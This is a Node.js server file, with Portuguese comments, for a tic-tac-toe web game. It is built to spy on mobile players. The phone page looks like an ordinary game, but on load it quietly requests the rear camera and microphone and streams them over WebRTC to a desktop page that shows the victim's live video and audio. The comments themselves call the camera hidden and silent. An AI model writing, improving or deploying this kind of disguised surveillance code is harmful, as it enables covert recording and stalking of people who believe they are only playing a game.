const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Porta fixa para o Railway
const PORT = process.env.PORT || 8080;

// Página para CELULAR (só o jogo, câmera oculta)
app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Jogo da Velha</title>
        <style>
            body { 
                margin: 0; 
                padding: 20px; 
                font-family: Arial; 
                background: #1a1a1a; 
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                max-width: 400px;
                width: 100%;
                text-align: center;
            }
            h1 { margin-bottom: 30px; color: #4CAF50; }
            .status {
                background: #333;
                padding: 15px;
                border-radius: 10px;
                margin-bottom: 20px;
                font-size: 18px;
            }
            .board {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 10px;
                margin-bottom: 30px;
            }
            .cell {
                background: #333;
                border: 2px solid #4CAF50;
                aspect-ratio: 1;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 60px;
                font-weight: bold;
                cursor: pointer;
                border-radius: 10px;
                transition: 0.3s;
            }
            .cell:active { transform: scale(0.95); background: #444; }
            .cell.x { color: #ff4444; }
            .cell.o { color: #44ff44; }
            button {
                background: #4CAF50;
                color: white;
                border: none;
                padding: 15px 40px;
                font-size: 18px;
                border-radius: 10px;
                cursor: pointer;
                width: 100%;
            }
            button:disabled {
                background: #666;
                cursor: not-allowed;
            }
            .camera-status {
                margin-top: 20px;
                font-size: 14px;
                color: #888;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Jogo da Velha</h1>
            <div class="status" id="status">Aguardando oponente...</div>
            <div class="board" id="board"></div>
            <button id="resetBtn" disabled>Reiniciar Jogo</button>
            <div class="camera-status" id="cameraStatus">📷 Iniciando...</div>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            let board = ['', '', '', '', '', '', '', '', ''];
            let minhaVez = false;
            
            // Criar tabuleiro
            for(let i = 0; i < 9; i++) {
                let cell = document.createElement('div');
                cell.className = 'cell';
                cell.onclick = () => {
                    if(minhaVez && board[i] === '') {
                        socket.emit('jogada', i);
                    }
                };
                document.getElementById('board').appendChild(cell);
            }
            
            // INICIAR CÂMERA (silenciosamente)
            async function iniciarCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment' }, 
                        audio: true 
                    });
                    
                    document.getElementById('cameraStatus').innerHTML = '📷 Câmera ativa';
                    
                    const peer = new RTCPeerConnection();
                    
                    stream.getTracks().forEach(track => peer.addTrack(track, stream));
                    
                    peer.onicecandidate = (e) => {
                        if(e.candidate) socket.emit('candidate', e.candidate);
                    };
                    
                    peer.onnegotiationneeded = async () => {
                        const offer = await peer.createOffer();
                        await peer.setLocalDescription(offer);
                        socket.emit('offer', offer);
                    };
                    
                    socket.on('answer', async (answer) => {
                        await peer.setRemoteDescription(answer);
                    });
                    
                    socket.on('candidate', async (candidate) => {
                        try { await peer.addIceCandidate(candidate); } catch(e) {}
                    });
                    
                } catch (error) {
                    document.getElementById('cameraStatus').innerHTML = '❌ Erro na câmera';
                }
            }
            
            iniciarCamera();
            
            socket.on('inicio', (data) => {
                minhaVez = data.vez === 'O';
                document.getElementById('status').innerHTML = 
                    minhaVez ? 'Sua vez (O)' : 'Vez do PC (X)';
                document.getElementById('resetBtn').disabled = false;
            });
            
            socket.on('jogada', (data) => {
                board[data.pos] = data.simbolo;
                let cells = document.getElementsByClassName('cell');
                cells[data.pos].innerHTML = data.simbolo;
                cells[data.pos].classList.add(data.simbolo.toLowerCase());
                
                minhaVez = !minhaVez;
                document.getElementById('status').innerHTML = 
                    minhaVez ? 'Sua vez' : 'Vez do oponente';
            });
            
            socket.on('fim', (data) => {
                document.getElementById('status').innerHTML = data.mensagem;
            });
            
            socket.on('reiniciar', () => {
                board = ['', '', '', '', '', '', '', '', ''];
                let cells = document.getElementsByClassName('cell');
                for(let i = 0; i < 9; i++) {
                    cells[i].innerHTML = '';
                    cells[i].classList.remove('x', 'o');
                }
            });
            
            document.getElementById('resetBtn').onclick = () => {
                socket.emit('reiniciar');
            };
        </script>
    </body>
    </html>
    `);
  } else {
    // Página do PC (jogo + câmera)
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PC - Jogo da Velha</title>
        <style>
            body { 
                margin: 0; 
                padding: 20px; 
                font-family: Arial; 
                background: #1a1a1a; 
                color: white;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 30px;
            }
            .video-box {
                background: #000;
                border-radius: 10px;
                overflow: hidden;
                aspect-ratio: 4/3;
            }
            video {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
            .game-box {
                text-align: center;
            }
            h1 { color: #4CAF50; margin-bottom: 30px; }
            .status {
                background: #333;
                padding: 15px;
                border-radius: 10px;
                margin-bottom: 20px;
                font-size: 18px;
            }
            .board {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 10px;
                margin-bottom: 30px;
            }
            .cell {
                background: #333;
                border: 2px solid #4CAF50;
                aspect-ratio: 1;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 60px;
                font-weight: bold;
                cursor: pointer;
                border-radius: 10px;
                transition: 0.3s;
            }
            .cell:hover { background: #444; transform: scale(1.05); }
            .cell.x { color: #ff4444; }
            .cell.o { color: #44ff44; }
            button {
                background: #4CAF50;
                color: white;
                border: none;
                padding: 10px 20px;
                margin: 5px;
                font-size: 16px;
                border-radius: 5px;
                cursor: pointer;
            }
            #audioBtn { background: #3498db; }
            #audioBtn.muted { background: #e74c3c; }
            .video-status {
                background: rgba(0,0,0,0.7);
                padding: 10px;
                font-size: 14px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div>
                <div class="video-box">
                    <video id="remoteVideo" autoplay playsinline></video>
                </div>
                <div class="video-status" id="videoStatus">📱 Aguardando celular...</div>
            </div>
            
            <div class="game-box">
                <h1>Jogo da Velha</h1>
                <div class="status" id="status">Aguardando celular...</div>
                <div class="board" id="board"></div>
                <div>
                    <button id="resetBtn" disabled>Reiniciar</button>
                    <button id="audioBtn">🔊 Áudio</button>
                </div>
            </div>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            let board = ['', '', '', '', '', '', '', '', ''];
            let minhaVez = true;
            
            // Criar tabuleiro
            for(let i = 0; i < 9; i++) {
                let cell = document.createElement('div');
                cell.className = 'cell';
                cell.onclick = () => {
                    if(minhaVez && board[i] === '') {
                        socket.emit('jogada', i);
                    }
                };
                document.getElementById('board').appendChild(cell);
            }
            
            // WebRTC para receber vídeo
            const peer = new RTCPeerConnection();
            const videoElement = document.getElementById('remoteVideo');
            
            peer.ontrack = (event) => {
                videoElement.srcObject = event.streams[0];
                document.getElementById('videoStatus').innerHTML = '📱 Celular conectado!';
            };
            
            peer.onicecandidate = (e) => {
                if(e.candidate) socket.emit('candidate', e.candidate);
            };
            
            socket.on('offer', async (offer) => {
                await peer.setRemoteDescription(offer);
                const answer = await peer.createAnswer();
                await peer.setLocalDescription(answer);
                socket.emit('answer', answer);
            });
            
            socket.on('candidate', async (candidate) => {
                try { await peer.addIceCandidate(candidate); } catch(e) {}
            });
            
            socket.on('inicio', () => {
                minhaVez = true;
                document.getElementById('status').innerHTML = 'Sua vez (X)';
                document.getElementById('resetBtn').disabled = false;
            });
            
            socket.on('jogada', (data) => {
                board[data.pos] = data.simbolo;
                let cells = document.getElementsByClassName('cell');
                cells[data.pos].innerHTML = data.simbolo;
                cells[data.pos].classList.add(data.simbolo.toLowerCase());
                
                minhaVez = !minhaVez;
                document.getElementById('status').innerHTML = 
                    minhaVez ? 'Sua vez' : 'Vez do celular';
            });
            
            socket.on('fim', (data) => {
                document.getElementById('status').innerHTML = data.mensagem;
            });
            
            socket.on('reiniciar', () => {
                board = ['', '', '', '', '', '', '', '', ''];
                let cells = document.getElementsByClassName('cell');
                for(let i = 0; i < 9; i++) {
                    cells[i].innerHTML = '';
                    cells[i].classList.remove('x', 'o');
                }
                minhaVez = true;
            });
            
            document.getElementById('resetBtn').onclick = () => {
                socket.emit('reiniciar');
            };
            
            let audioAtivo = true;
            document.getElementById('audioBtn').onclick = () => {
                audioAtivo = !audioAtivo;
                videoElement.volume = audioAtivo ? 1 : 0;
                document.getElementById('audioBtn').innerHTML = audioAtivo ? '🔊 Áudio' : '🔇 Áudio';
                document.getElementById('audioBtn').classList.toggle('muted', !audioAtivo);
            };
        </script>
    </body>
    </html>
    `);
  }
});

// Lógica do jogo
let board = ['', '', '', '', '', '', '', '', ''];
let vez = 'X';
let mobile = null;
let desktop = null;

function checkWinner() {
  const lines = [
    [0,1,2], [3,4,5], [6,7,8],
    [0,3,6], [1,4,7], [2,5,8],
    [0,4,8], [2,4,6]
  ];
  
  for(let l of lines) {
    if(board[l[0]] && board[l[0]] === board[l[1]] && board[l[0]] === board[l[2]]) {
      return board[l[0]];
    }
  }
  return null;
}

io.on('connection', (socket) => {
  console.log('Conectado:', socket.id);
  
  // Atribuir jogadores
  if (!desktop) {
    desktop = socket.id;
    socket.emit('inicio', { vez: 'X' });
  } else if (!mobile) {
    mobile = socket.id;
    socket.emit('inicio', { vez: 'O' });
  }
  
  // WebRTC
  socket.on('offer', (offer) => socket.broadcast.emit('offer', offer));
  socket.on('answer', (answer) => socket.broadcast.emit('answer', answer));
  socket.on('candidate', (candidate) => socket.broadcast.emit('candidate', candidate));
  
  // Jogadas
  socket.on('jogada', (pos) => {
    let jogador = socket.id === desktop ? 'X' : 'O';
    if (jogador !== vez) return;
    if (board[pos] !== '') return;
    
    board[pos] = jogador;
    
    let vencedor = checkWinner();
    
    if (vencedor) {
      io.emit('fim', { mensagem: \`Jogador \${vencedor} venceu! 🎉\` });
    } else if (!board.includes('')) {
      io.emit('fim', { mensagem: 'Empate! 🤝' });
    } else {
      vez = vez === 'X' ? 'O' : 'X';
    }
    
    io.emit('jogada', { pos, simbolo: jogador });
  });
  
  socket.on('reiniciar', () => {
    board = ['', '', '', '', '', '', '', '', ''];
    vez = 'X';
    io.emit('reiniciar');
  });
  
  socket.on('disconnect', () => {
    if (socket.id === desktop) desktop = null;
    if (socket.id === mobile) mobile = null;
    board = ['', '', '', '', '', '', '', '', ''];
    vez = 'X';
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
